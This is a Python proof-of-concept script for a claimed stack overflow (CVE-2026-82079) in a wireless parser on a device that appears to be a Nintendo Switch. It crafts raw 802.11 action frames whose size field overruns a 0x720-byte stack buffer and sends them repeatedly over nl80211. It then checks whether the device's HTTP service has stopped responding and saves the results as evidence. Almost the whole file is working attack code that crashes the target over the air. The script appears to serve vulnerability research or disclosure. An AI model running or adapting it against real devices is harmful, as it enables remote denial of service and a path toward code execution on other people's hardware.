#!/usr/bin/env -S python3 -u
"""Stack overflow differential probe.

CVE-2026-82079 static analysis finding:
- FUN_710003b470 memcpy(stack_buf+0x78, payload, size)
- stack_buf = 0x798 bytes, available from 0x78 = 0x720 (1824 bytes)
- For type 1 parser: size = BE16(body[0x1DA:0x1DC])
- Stack overflow when BE16(body[0x1DA]) > 0x720

This test varies body[0x1DA:0x1DC] with SAFE fill (0x41) to see
if increasing the size field past 0x720 produces different behavior.

If 0x41 fill is safe at size=256 but crashes at size=1825,
that confirms the stack overflow path is reachable.
"""

import os
import struct
import socket
import time
import json
from pathlib import Path

_LDN_ROOT = Path(__file__).resolve().parent.parent.parent
IFACE = "wlp5s0"
SWITCH_MAC = bytes.fromhex("ecc40df3dcdb")
SRC_MAC = bytes.fromhex("227ccee0bd56")
FREQ = 2412
LP2P_HEADER = b"\x7f\x00\x22\xaa\x04\x01\x01\x01\x00\x00\x00\x00"
EVIDENCE_DIR = str(_LDN_ROOT / "evidence" / "action_frame_overflow")


def get_nl80211_family():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 100
    s.bind((pid, 0))
    name = b'nl80211\x00'
    nla_b = struct.pack('HH', 4 + len(name), 2) + name
    if len(nla_b) % 4:
        nla_b += b'\x00' * (4 - len(nla_b) % 4)
    p = struct.pack('BBH', 3, 1, 0) + nla_b
    s.sendto(struct.pack('IHHII', 16 + len(p), 0x10, 3, 1, pid) + p, (0, 0))
    data = s.recv(8192)
    s.close()
    off = 20
    nllen = struct.unpack_from('I', data, 0)[0]
    while off < nllen:
        nla_len, nla_type = struct.unpack_from('HH', data, off)
        if nla_type == 1:
            return struct.unpack_from('H', data, off + 4)[0]
        off += (nla_len + 3) & ~3
    raise RuntimeError("nl80211 family not found")


def nla(t, d):
    if isinstance(d, int):
        d = struct.pack('I', d)
    n = struct.pack('HH', 4 + len(d), t) + d
    if len(n) % 4:
        n += b'\x00' * (4 - len(n) % 4)
    return n


def send_frame(fam_id, ifindex, frame_bytes):
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 500 + (hash(frame_bytes[:16]) & 0xFFFF)
    s.bind((pid, 0))
    s.settimeout(2.0)
    genlhdr = struct.pack('BBH', 59, 0, 0)
    nla_data = nla(3, ifindex) + nla(38, FREQ) + nla(51, frame_bytes)
    payload = genlhdr + nla_data
    nlhdr = struct.pack('IHHII', 16 + len(payload), fam_id, 1 | 4, 99999, pid)
    try:
        s.sendto(nlhdr + payload, (0, 0))
        resp = s.recv(16384)
        _, msg_type = struct.unpack_from('IH', resp, 0)
        if msg_type == 2:
            err = struct.unpack_from('i', resp, 16)[0]
            s.close()
            return err
        s.close()
        return 0
    except socket.timeout:
        s.close()
        return -110
    except Exception as e:
        s.close()
        return str(e)


def build_frame(body):
    frame = bytearray()
    frame += struct.pack('<H', 0x00D0)
    frame += b"\x00\x00"
    frame += SWITCH_MAC
    frame += SRC_MAC
    frame += SWITCH_MAC
    frame += struct.pack('<H', 0x0000)
    frame += LP2P_HEADER
    frame += body
    return bytes(frame)


def build_body(body_size, fill, size_field):
    """Build type 3 body with specific size field at 0x1DA."""
    body = bytearray(body_size)
    body[0x21] = 0x03
    struct.pack_into(">H", body, 0x22, body_size - 0x38)
    body[0x26] = 0x01
    body[0x27] = 0x01
    if body_size > 0x1DC:
        struct.pack_into(">H", body, 0x1DA, size_field)
    for i in range(0x5C, body_size):
        body[i] = fill
    return bytes(body)


def check_alive():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(('192.168.0.1', 80))
        s.sendall(b'GET / HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n')
        d = s.recv(512)
        s.close()
        return b'HTTP/' in d
    except Exception:
        return False


def wait_alive(timeout=60):
    start = time.time()
    while time.time() - start < timeout:
        if check_alive():
            return True
        time.sleep(2)
    return False


def test_size_field(fam_id, ifindex, size_field, fill=0x41, frame_count=60, wait_s=5):
    """Send frames with specific size field and check HTTP afterwards."""
    if not check_alive():
        print(f"  Waiting for Switch to come back alive...")
        if not wait_alive(90):
            return "TIMEOUT_PRE"

    body = build_body(0x800, fill, size_field)
    frame = build_frame(body)

    errors = []
    for i in range(frame_count):
        rc = send_frame(fam_id, ifindex, frame)
        if rc != 0:
            errors.append(rc)
        time.sleep(0.002)

    time.sleep(wait_s)

    alive1 = check_alive()
    if not alive1:
        time.sleep(3)
        alive2 = check_alive()
        if not alive2:
            time.sleep(10)
            alive3 = check_alive()
            return "UNAVAIL_PERSISTENT" if not alive3 else "UNAVAIL_DELAYED_RECOVER"
        return "UNAVAIL_BRIEF"
    return "OK"


def main():
    ifindex = socket.if_nametoindex(IFACE)
    fam_id = get_nl80211_family()
    print(f"Interface: {IFACE}, nl80211 family: {fam_id}")

    if not check_alive():
        print("Switch not reachable. Waiting...")
        if not wait_alive(60):
            print("FATAL: Switch not reachable")
            return
    print("Switch is alive.\n")

    results = {}

    tests = [
        ("baseline_0x0100_0x41", 0x0100, 0x41, "size=256 (baseline, safe fill)"),
        ("baseline_0x0100_0xFF", 0x0100, 0xFF, "size=256 (baseline, known-crash fill)"),
        ("size_0x0001_0x41",     0x0001, 0x41, "size=1 (minimum)"),
        ("size_0x0400_0x41",     0x0400, 0x41, "size=1024 (under threshold)"),
        ("size_0x0720_0x41",     0x0720, 0x41, "size=1824 (at threshold, no overflow)"),
        ("size_0x0721_0x41",     0x0721, 0x41, "size=1825 (1 byte OVER, stack overflow!)"),
        ("size_0x0800_0x41",     0x0800, 0x41, "size=2048 (224-byte stack overflow)"),
    ]

    for name, size_field, fill, desc in tests:
        print(f"{'='*65}")
        print(f"  TEST: {desc}")
        print(f"  size_field=0x{size_field:04X}, fill=0x{fill:02X}")
        print(f"{'='*65}")

        result = test_size_field(fam_id, ifindex, size_field, fill)
        results[name] = {
            "size_field": f"0x{size_field:04X}",
            "fill": f"0x{fill:02X}",
            "description": desc,
            "result": result,
        }
        print(f"  RESULT: {result}\n")

        if "UNAVAIL" in result:
            print(f"  Switch unavailable after test. Waiting for recovery...")
            wait_alive(90)

    print("\n" + "="*65)
    print("SUMMARY")
    print("="*65)
    for name, info in results.items():
        print(f"  {name}: {info['result']}")

    print("\nINTERPRETATION:")
    b1 = results.get("baseline_0x0100_0x41", {}).get("result")
    s721 = results.get("size_0x0721_0x41", {}).get("result")
    s800 = results.get("size_0x0800_0x41", {}).get("result")

    if b1 == "OK" and s721 and "UNAVAIL" in s721:
        print("  CONFIRMED: Stack overflow reachable!")
        print("  size=256 (safe) → OK; size=1825 (overflow) → crash")
        print("  This confirms CVE-2026-82079 (CWE-121) on FW 22.5.0")
    elif b1 == "OK" and s721 == "OK":
        print("  NOT CONFIRMED: Size field change had no effect")
        print("  Possible: different parser type (not type 1) is used,")
        print("  or body[0x1DA] doesn't map to the payload size field")
    else:
        print(f"  INCONCLUSIVE: baseline={b1}, size=1825: {s721}, size=2048: {s800}")

    evidence_path = os.path.join(EVIDENCE_DIR, "stack_overflow_probe.json")
    with open(evidence_path, 'w') as f:
        json.dump({
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "test": "stack_overflow_differential_probe",
            "hypothesis": "BE16(body[0x1DA]) > 0x720 triggers stack overflow in FUN_710003b470",
            "threshold": "0x720 (1824 bytes)",
            "results": results,
        }, f, indent=2)
    print(f"\nEvidence saved to {evidence_path}")


if __name__ == "__main__":
    main()
